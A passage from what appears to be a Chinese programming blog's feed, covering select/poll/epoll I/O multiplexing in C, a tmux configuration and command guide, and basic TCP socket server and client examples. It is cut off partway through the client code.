class="hljs-keyword">include</span> <span class="hljs-string">&lt;netinet/in.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/select.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;arpa/inet.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span>** argv)</span><br>&#123;<br><span class="hljs-type">int</span> fd = New_Socket(argv[<span class="hljs-number">1</span>], argv[<span class="hljs-number">2</span>], <span class="hljs-number">10</span>);<br><span class="hljs-keyword">if</span> (fd == <span class="hljs-number">-1</span>) &#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Create Socket error!\n&quot;</span>);<br><span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>&#125;<br>fd_set fdset, rset;<br><span class="hljs-comment">//创建监听集合</span><br>FD_ZERO(&amp;fdset);<br><span class="hljs-comment">//将需要监听的文件描述符加入到监听集合</span><br>FD_SET(fd, &amp;fdset);<br>    .....<br><span class="hljs-type">int</span> maxfd = fd + <span class="hljs-number">1</span>;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">timeval</span> <span class="hljs-title">timeout</span> =</span> &#123; <span class="hljs-number">20</span>, <span class="hljs-number">20</span> &#125;;<br><span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>) &#123;<br>rset = fdset;<br><span class="hljs-type">int</span> nfds = select(maxfd, &amp;rset, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, &amp;timeout);<br><span class="hljs-comment">// select函数返回值大于0代表有文件描述符有数据到来,返回值小于0代表发生了异常,返回值等于0代表超时</span><br><span class="hljs-keyword">if</span> (nfds &lt; <span class="hljs-number">0</span>) &#123;<br>perror(<span class="hljs-string">&quot;select&quot;</span>);<br><span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (nfds == <span class="hljs-number">0</span>) &#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;select timeout\n&quot;</span>);<br><span class="hljs-keyword">continue</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-keyword">if</span> (FD_ISSET(fd, &amp;rset)) &#123;<br>Handler(fd, &amp;fdset);<br>&#125;<br>&#125;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="2-使用poll实现I-x2F-O多路复用"><a href="#2-使用poll实现I-x2F-O多路复用" class="headerlink" title="2.使用poll实现I&#x2F;O多路复用"></a>2.使用poll实现I&#x2F;O多路复用</h4>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pollfd</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">int</span> fd;<span class="hljs-comment">//需要监听的文件描述符</span><br>    <span class="hljs-type">short</span> event;<span class="hljs-comment">//需要监听的事件</span><br>    <span class="hljs-type">short</span> revent;<span class="hljs-comment">//已经发生的事件</span><br>&#125;<br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAX_FD 100</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc,<span class="hljs-type">char</span> **argv)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pollfd</span> <span class="hljs-title">fd</span>[<span class="hljs-title">MAX_FD</span>];</span><br>    <span class="hljs-comment">//设置监听事件和监听的文件描述符</span><br>    fd[i].event = POLLIN<br>    <span class="hljs-comment">//设置完成后</span><br>    <span class="hljs-type">int</span> nfds = poll(<span class="hljs-keyword">struct</span> pollfd fds[], <span class="hljs-type">nfds_t</span> nfds, <span class="hljs-type">int</span> timeout);<br><span class="hljs-comment">//比较revent看revent是否发生了变化,若发生了变化则文件描述符则该文件描述符有数据到来</span><br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>;i&lt;MAX_FD,i++)<br>    &#123;<br><br>        <span class="hljs-keyword">if</span>(fd[i].revent &amp; POLLIN)<br>        .....<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="3-使用epoll实现I-x2F-O多路复用"><a href="#3-使用epoll实现I-x2F-O多路复用" class="headerlink" title="3.使用epoll实现I&#x2F;O多路复用"></a>3.使用epoll实现I&#x2F;O多路复用</h4>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// 内核中间加一个 ep 对象，把所有需要监听的 socket 都放到 ep 对象中</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">epoll_create</span><span class="hljs-params">(<span class="hljs-type">int</span> size)</span>; <br><br>负责把 socket 增加、删除到内核红黑树<br><span class="hljs-type">int</span> <span class="hljs-title function_">epoll_ctl</span><span class="hljs-params">(<span class="hljs-type">int</span> epfd, <span class="hljs-type">int</span> op, <span class="hljs-type">int</span> fd, <span class="hljs-keyword">struct</span> epoll_event *event)</span>;<br><br>负责检测可读队列，没有可读 socket 则阻塞进程<br><span class="hljs-type">int</span> <span class="hljs-title function_">epoll_wait</span><span class="hljs-params">(<span class="hljs-type">int</span> epfd, <span class="hljs-keyword">struct</span> epoll_event * events, <span class="hljs-type">int</span> maxevents, <span class="hljs-type">int</span> timeout)</span>;<br><span class="hljs-comment">//创建监听集合</span><br><span class="hljs-type">int</span> epfd = epoll_create(<span class="hljs-number">100</span>);创建一个监听对象<br>epoll_ctl()<span class="hljs-comment">//将需要监听的文件描述符加入到监听对象中,或者从监听对象中一处一个文件描述符</span><br>epoll_wait()<span class="hljs-comment">//开始等待事件发生</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>编程</category>
      
    </categories>
    
    
    <tags>
      
      <tag>网络编程</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>tmux基本使用</title>
    <link href="/2022/04/17/tmux%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/"/>
    <url>/2022/04/17/tmux%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<h1 id="tmux配置教程"><a href="#tmux配置教程" class="headerlink" title="tmux配置教程"></a>tmux配置教程</h1><h3 id="1-tmux是什么"><a href="#1-tmux是什么" class="headerlink" title="1.tmux是什么?"></a>1.tmux是什么?</h3><p>tmux是一个终端复用工具,在实际开发运维中,可以用来保存当前工作状态,也可以将当前的单个终端拆分多个窗口。</p><h3 id="2-tmux的基本结构"><a href="#2-tmux的基本结构" class="headerlink" title="2.tmux的基本结构"></a>2.tmux的基本结构</h3><p>tmux为C&#x2F;S架构,tmux进程为守护进程,独立于终端之外,在不使用tmux的情况下,在当前终端执行的所有任务都为当前终端的子进程,而在使用了tmux之后,在tmux下执行的任务为tmux的子进程,而tmux为一个守护进程,因此不用担心在退出当前终端或者远程ssh突然断网时，执行的任务被杀死的情况.</p><h3 id="3-tmux的三个概念"><a href="#3-tmux的三个概念" class="headerlink" title="3.tmux的三个概念"></a>3.tmux的三个概念</h3><ul><li><p>1.session</p><p>一个session就是一个会话,session为tmux的一个会话,一个tmux可以同时开多个session</p></li><li><p>2.windows</p><p>window为session的子集,一个session可以有有多个window</p></li><li><p>3.pannel</p><p>一个pannel为一个窗格,为window的子集,一个window可以有多个pannel</p></li></ul><h3 id="4-tmux的安装使用"><a href="#4-tmux的安装使用" class="headerlink" title="4.tmux的安装使用"></a>4.tmux的安装使用</h3><h5 id="tmux的安装"><a href="#tmux的安装" class="headerlink" title="tmux的安装"></a>tmux的安装</h5>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo pacman -S tmux<br></code></pre></td></tr></table></figure><h5 id="tmux配置文件"><a href="#tmux配置文件" class="headerlink" title="tmux配置文件"></a>tmux配置文件</h5><p>  tmux系统配置文件为&#x2F;etc&#x2F;tmux.conf,用户配置文件为~&#x2F;.tmux.conf</p>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#解绑prefix键位</span><br>unbind C-b<br>unbind <span class="hljs-string">&#x27;&quot;&#x27;</span><br>unbind <span class="hljs-string">&#x27;%&#x27;</span><br><span class="hljs-comment">#设置prefix键位为C-a</span><br><span class="hljs-built_in">set</span> -g prefix C-a<br><span class="hljs-built_in">bind</span> C-a send-prefix<br><span class="hljs-comment">#设置切分窗格键位为prefix和h以及prefix和v</span><br><span class="hljs-built_in">bind</span> h split-window -h<br><span class="hljs-built_in">bind</span> v split-window -v<br><span class="hljs-comment">#设置C-r为重载tmux配置文件(指定-n为不用使用prefix键位就可以触发)</span><br>bind-key -n C-r source-file ~/.tmux.conf<br><span class="hljs-comment">#设置调整窗格大小键位(指定-r键位为不用每次触发的时候都要使用prefix键位(只要摁一次prefix键位就可以持续出发操作))</span><br><span class="hljs-built_in">bind</span> -r H resize-pane -L 5<br><span class="hljs-built_in">bind</span> -r J resize-pane -D 5<br><span class="hljs-built_in">bind</span> -r K resize-pane -U 5<br><span class="hljs-built_in">bind</span> -r L resize-pane -R 5<br><span class="hljs-comment">#bind k selectp -U</span><br><span class="hljs-comment">#bind h selectp -L</span><br><span class="hljs-comment">#bind j selectp -D</span><br><span class="hljs-comment">#bind l selectp -R</span><br><span class="hljs-comment">#bind -r ^k resizep -U 5</span><br><span class="hljs-comment">#bind -r ^h resizep -L 5</span><br><span class="hljs-comment">#bind -r ^j resizep -D 5</span><br><span class="hljs-comment">#bind -r ^l resizep -R 5</span><br></code></pre></td></tr></table></figure><h5 id="tmux常用命令"><a href="#tmux常用命令" class="headerlink" title="tmux常用命令"></a>tmux常用命令</h5>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#创建一个tmux会话并在该tmux会话下创建一个窗口并在该窗口下创建一个pannel</span><br>tmux<br><span class="hljs-comment">#查看tmux会话</span><br>tmux list-session<br><span class="hljs-comment">#离开tmux会话</span><br>tmux detach<br><span class="hljs-comment">#进入已经打开的tmux会话</span><br>tmux attach<br><span class="hljs-comment">#Ctrl+b %：划分左右两个窗格。</span><br><span class="hljs-comment">#Ctrl+b &quot;：划分上下两个窗格。</span><br><span class="hljs-comment">#Ctrl+b &lt;arrow key&gt;：光标切换到其他窗格。&lt;arrow key&gt;是指向要切换到的窗格的方向键，比如切换到下方窗格，就按方向键↓。</span><br><span class="hljs-comment">#Ctrl+b ;：光标切换到上一个窗格。</span><br><span class="hljs-comment">#Ctrl+b o：光标切换到下一个窗格。</span><br><span class="hljs-comment">#Ctrl+b &#123;：当前窗格与上一个窗格交换位置。</span><br><span class="hljs-comment">#Ctrl+b &#125;：当前窗格与下一个窗格交换位置。</span><br><span class="hljs-comment">#Ctrl+b Ctrl+o：所有窗格向前移动一个位置，第一个窗格变成最后一个窗格。</span><br><span class="hljs-comment">#Ctrl+b Alt+o：所有窗格向后移动一个位置，最后一个窗格变成第一个窗格。</span><br><span class="hljs-comment">#Ctrl+b x：关闭当前窗格。</span><br><span class="hljs-comment">#Ctrl+b !：将当前窗格拆分为一个独立窗口。</span><br><span class="hljs-comment">#Ctrl+b z：当前窗格全屏显示，再使用一次会变回原来大小。</span><br><span class="hljs-comment">#Ctrl+b Ctrl+&lt;arrow key&gt;：按箭头方向调整窗格大小。</span><br><span class="hljs-comment">#Ctrl+b q：显示窗格编号。</span><br><br><span class="hljs-comment">#切换窗格</span><br><br><span class="hljs-comment"># 光标切换到上方窗格</span><br>tmux select-pane -U<br><br><span class="hljs-comment"># 光标切换到下方窗格</span><br>tmux select-pane -D<br><br><span class="hljs-comment"># 光标切换到左边窗格</span><br>tmux select-pane -L<br><br><span class="hljs-comment"># 光标切换到右边窗格</span><br>tmux select-pane -R<br><br><span class="hljs-comment">#交换窗格</span><br><br><span class="hljs-comment"># 当前窗格上移</span><br>tmux swap-pane -U<br><br><span class="hljs-comment"># 当前窗格下移</span><br>tmux swap-pane -D<br><span class="hljs-comment">#窗口管理</span><br><br><span class="hljs-comment">#创建一个新的窗口</span><br>tmux new-window <span class="hljs-string">&quot;window-name&quot;</span><br><span class="hljs-comment">#切换窗口</span><br>tmux select-window -t &lt;window-number&gt; or &lt;window-name&gt;<br><span class="hljs-comment">#重命名window(修改当前窗口的名称)</span><br>tmux rename-window <span class="hljs-string">&quot;new-name&quot;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>软件和系统配置</category>
      
    </categories>
    
    
    <tags>
      
      <tag>软件配置与使用</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>socket编程</title>
    <link href="/2022/04/17/socket%E7%BC%96%E7%A8%8B/"/>
    <url>/2022/04/17/socket%E7%BC%96%E7%A8%8B/</url>
    
    <content type="html"><![CDATA[<h1 id="socket编程"><a href="#socket编程" class="headerlink" title="socket编程"></a>socket编程</h1><h4 id="1-什么是socket"><a href="#1-什么是socket" class="headerlink" title="1.什么是socket?"></a>1.什么是socket?</h4><p>socket是应用层与TCP&#x2F;IP协议簇通信的中间抽象层,就是对网络中不同主机的应用进程之间进行双向通信的端点的抽象,提供了应用层进程利用网络协议交换数据的机制。套接字上联应用层，下联协议栈，是应用程序利用网络协议进行通信的接口</p><h4 id="2-socket分类"><a href="#2-socket分类" class="headerlink" title="2.socket分类"></a>2.socket分类</h4><ul><li><p>SOCK_STREAM</p><p>基于TCP协议,面向连接,提供可靠传输,拥塞控制,数据校验,数据重传</p></li><li><p>SOCK_DGRAM</p><p>尽最大努力交付,可以一对多通信,多对多通信</p></li><li><p>SOCK_RAM</p><p>基于ip协议,可以基于ip协议自行组装数据包,利用原始套接字可以处理如ICMP,IGMP,等网络层的数据包。</p></li></ul><h4 id="3-常用的api"><a href="#3-常用的api" class="headerlink" title="3.常用的api"></a>3.常用的api</h4>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">socket</span><span class="hljs-params">(<span class="hljs-type">int</span> domain,<span class="hljs-type">int</span> type,<span class="hljs-type">int</span> protocol)</span>                    <span class="hljs-comment">//用于创建一个socket</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">bind</span><span class="hljs-params">(<span class="hljs-type">int</span> fd,<span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> sockaddr *addr,<span class="hljs-type">socklen_t</span> len)</span>      <span class="hljs-comment">//用于绑定一个端口</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">listen</span><span class="hljs-params">(<span class="hljs-type">int</span> fd,<span class="hljs-type">int</span> backlog)</span>;                                 <span class="hljs-comment">//用于监听即将到来的连接</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">connect</span><span class="hljs-params">(<span class="hljs-type">int</span> fd,<span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> sockaddr *addr,<span class="hljs-type">socklen_t</span> len)</span>   <span class="hljs-comment">//用于连接一个远程服务器</span><br><span class="hljs-type">ssize_t</span> <span class="hljs-title function_">read</span><span class="hljs-params">(<span class="hljs-type">int</span> fd,<span class="hljs-type">void</span> *buf,<span class="hljs-type">size_t</span> count)</span>                     <span class="hljs-comment">//用于读取socket缓冲区内容</span><br><span class="hljs-type">ssize_t</span> <span class="hljs-title function_">write</span><span class="hljs-params">(<span class="hljs-type">int</span> fd,<span class="hljs-type">void</span> *buf,<span class="hljs-type">size_t</span> count)</span>                    <span class="hljs-comment">//用于将数据拷贝到发送缓冲区</span><br><span class="hljs-type">ssize_t</span> <span class="hljs-title function_">send</span><span class="hljs-params">(<span class="hljs-type">int</span> fd,<span class="hljs-type">const</span> <span class="hljs-type">void</span> *buf,<span class="hljs-type">size_t</span> len,<span class="hljs-type">int</span> flags)</span>       <span class="hljs-comment">//类似于write函数</span><br><span class="hljs-type">ssize_t</span> <span class="hljs-title function_">recv</span><span class="hljs-params">(<span class="hljs-type">int</span> sockfd,<span class="hljs-type">void</span> *buf,<span class="hljs-type">size_t</span> len,<span class="hljs-type">int</span> flags)</span>         <span class="hljs-comment">//类似于read函数</span><br><span class="hljs-type">ssize_t</span> <span class="hljs-title function_">sendto</span><span class="hljs-params">(<span class="hljs-type">int</span> sockfd,<span class="hljs-type">const</span> <span class="hljs-type">void</span> *buf,<span class="hljs-type">size_t</span> len,<span class="hljs-type">int</span> flags,<span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> sockaddr *dest_addr,<span class="hljs-type">socklen_t</span> addrlen)</span>;                         <span class="hljs-comment">//用于udp socket编程发送数据</span><br><span class="hljs-type">ssize_t</span> <span class="hljs-title function_">recvfrom</span><span class="hljs-params">(<span class="hljs-type">int</span> sockfd,<span class="hljs-type">void</span> *buf,<span class="hljs-type">size_t</span> len,<span class="hljs-type">int</span> flags,<span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> sockaddr *src_addr,<span class="hljs-type">socklen_t</span> *addrlen)</span>;                                    <span class="hljs-comment">//用于udp socket编程接收数据</span><br></code></pre></td></tr></table></figure><h4 id="4-基本的编程步骤"><a href="#4-基本的编程步骤" class="headerlink" title="4.基本的编程步骤"></a>4.基本的编程步骤</h4><p>  服务端</p>  <pre><code class=" mermaid">graph TD;a(socket 创建socket文件)--&gt;b(bind 绑定端口和ip地址)--&gt;c(listen 开始监听ip和端口)--&gt;d(accept 接收来自客户端的连接)--&gt;e(read/write开始和客户端收发数据)</code></pre><p>  客户端</p>  <pre><code class=" mermaid">graph TD;a(socket 创建socket文件)--&gt;b(connect 连接服务器)--&gt;c(read/write,开始和服务端收发数据)</code></pre><h4 id="5-实例"><a href="#5-实例" class="headerlink" title="5.实例"></a>5.实例</h4><h5 id="服务器"><a href="#服务器" class="headerlink" title="服务器"></a>服务器</h5>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;arpa/inet.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;netinet/in.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;strings.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/socket.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SOCKLEN (sizeof(struct sockaddr))</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">Usage</span><span class="hljs-params">(<span class="hljs-type">char</span>* argv)</span><br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Usage:\n&quot;</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s SERVERADDR SERVERPORT&quot;</span>, argv);<br>&#125;<br><span class="hljs-type">int</span> <span class="hljs-title function_">New_Socket</span><span class="hljs-params">(<span class="hljs-type">char</span>* addr, <span class="hljs-type">char</span>* port, <span class="hljs-type">int</span> backlog)</span><br>&#123;<br><span class="hljs-comment">//创建socket</span><br><span class="hljs-type">int</span> fd = socket(AF_INET, SOCK_STREAM, <span class="hljs-number">0</span>);<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sockaddr_in</span> <span class="hljs-title">ADDR</span>;</span><br>ADDR.sin_family = AF_INET;<br>ADDR.sin_port = htons(atoi(port));<br><span class="hljs-keyword">if</span> (inet_pton(AF_INET, addr, &amp;ADDR.sin_addr) != <span class="hljs-number">1</span>) &#123;<br>perror(<span class="hljs-string">&quot;inet_pton&quot;</span>);<br>&#125;<br><span class="hljs-comment">//绑定地址以及端口</span><br><span class="hljs-keyword">if</span> (bind(fd, (<span class="hljs-keyword">struct</span> sockaddr*)&amp;ADDR, SOCKLEN) != <span class="hljs-number">0</span>) &#123;<br>perror(<span class="hljs-string">&quot;bind&quot;</span>);<br>&#125;<br><span class="hljs-comment">//进入监听状态,等待接收来之客户端的连接</span><br><span class="hljs-keyword">if</span> (listen(fd, backlog) != <span class="hljs-number">0</span>) &#123;<br>perror(<span class="hljs-string">&quot;listen&quot;</span>);<br>&#125;<br><span class="hljs-comment">//返回socket</span><br><span class="hljs-keyword">return</span> fd;<br>&#125;<br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span>** argv)</span><br>&#123;<br><span class="hljs-type">socklen_t</span> len = <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> sockaddr_in);<br><span class="hljs-keyword">if</span> (argc != <span class="hljs-number">3</span>) &#123;<br>Usage(argv[<span class="hljs-number">0</span>]);<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br><span class="hljs-type">int</span> fd = New_Socket(argv[<span class="hljs-number">1</span>], argv[<span class="hljs-number">2</span>], <span class="hljs-number">5</span>);<br><span class="hljs-comment">//定义客户端信息变量</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sockaddr_in</span> <span class="hljs-title">client_addr</span>;</span><br><span class="hljs-comment">//接收来自客户端发来的请求</span><br><span class="hljs-type">int</span> clientfd = accept(fd, (<span class="hljs-keyword">struct</span> sockaddr*)&amp;client_addr, &amp;len);<br><span class="hljs-keyword">if</span> (clientfd == <span class="hljs-number">-1</span>) &#123;<br>perror(<span class="hljs-string">&quot;accept&quot;</span>);<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br><span class="hljs-type">char</span> buffer[<span class="hljs-number">100</span>];<br>bzero(buffer, <span class="hljs-number">100</span>);<br><span class="hljs-comment">//接收来自客户端发来的数据</span><br><span class="hljs-keyword">if</span> (read(clientfd, buffer, <span class="hljs-number">100</span>) &gt; <span class="hljs-number">0</span>) &#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;recv from client:%s&quot;</span>, buffer);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>perror(<span class="hljs-string">&quot;read&quot;</span>);<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h5 id="客户端"><a href="#客户端" class="headerlink" title="客户端"></a>客户端</h5>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//客户端</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;arpa/inet.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;netinet/in.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/socket.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SOCKLEN (sizeof(struct sockaddr))</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">Usage</span><span class="hljs-params">(<span class="hljs-type">char</span>* argv)</span> <span class="hljs-comment">//使用帮助函数</span><br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Usage:\n&quot;</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s SERVERADDR SERVERPORT&quot;</span>, 